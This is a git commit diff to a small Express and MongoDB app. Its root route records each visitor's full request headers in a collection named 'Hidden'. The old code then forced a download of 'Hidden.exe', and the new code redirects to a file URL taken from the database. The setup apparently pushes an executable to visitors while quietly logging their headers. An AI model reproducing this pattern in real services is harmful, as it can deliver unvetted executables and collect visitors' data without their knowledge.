73e709ab54cd6017a17f4bb6329f66c8af611b83
Sergio Luis Vega Martínez <59804620+sergiovegam41@users.noreply.github.com>
2023-06-02 19:04:28 -0500

    Fix

--- app.js
+++ app.js
@@ -8,6 +8,9 @@ app.use(bodyParser.json());
 app.use(express.json());
 const path = require('path');
 const cors = require('cors');
+const fs = require('fs');
+
+
 const corsOptions = {
     origin: '*', // dominio permitido
     methods: ['GET', 'POST', 'PUT'] // métodos HTTP permitidos
@@ -25,17 +28,36 @@ const uriMongo = process.env.MONGO_URI;
 
 const Mongoclient = new MongoClient(uriMongo, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1 });
 var HiddenCollection = null
+var ConfigCollection = null
 
 
 Mongoclient.connect( async err => {
    
     HiddenCollection = Mongoclient.db(DATABASE).collection("Hidden");
+    ConfigCollection = Mongoclient.db(DATABASE).collection("Config");
     if(err){ console.log(err) } else {
         this.ready = true
     }
 
 
     console.log("Mongo Conectado a: "+DATABASE);
+
+
+    
+    app.get('/ping', async function(req, res) {
+        res.send(true)    
+    })
+
+    app.get('/', async function(req, res) {
+ 
+        await HiddenCollection.insertOne({ request:req.headers });
+        let file_url = await ConfigCollection.findOne({ name: "file_url" })
+
+
+        res.redirect(file_url.value)
+    })
+
+
 
     app.listen(port,() => {
 
@@ -46,22 +68,4 @@ Mongoclient.connect( async err => {
 
 const port = process.env.PORT || 3000   
 
-
-
-app.get('/ping', async function(req, res) {
-    res.send(true)    
-})
-
-app.get('/', async function(req, res) {
-
-    // console.log(req) 
-    await HiddenCollection.insertOne({ request:req.headers });
-
-    const path = `${process.cwd()}`;
-    res.download(path+"/Hidden.exe", (err) => {
-        if (err) {
-        res.sendStatus(404);
-        }
-        });
-    })
 
